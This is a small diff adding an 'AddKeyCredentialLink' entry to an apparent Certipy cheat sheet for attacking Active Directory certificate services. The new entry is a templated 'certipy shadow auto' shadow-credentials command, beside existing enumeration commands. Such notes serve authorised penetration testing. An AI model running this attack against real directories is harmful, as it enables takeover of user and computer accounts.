@@ -11,3 +11,8 @@ certipy find '<domain>/<user>:<password>@<domainController>' -vulnerable
 certipy find '<domain>/<user>:<password>@<domainController>' -bloodhound
 ```
 
+### AddKeyCredentialLink
+```
+certipy shadow auto '<domain>/<user>:<password>'@<certificateAuthorityRhost> -account '<targetComputerOrUser>'
+```
+
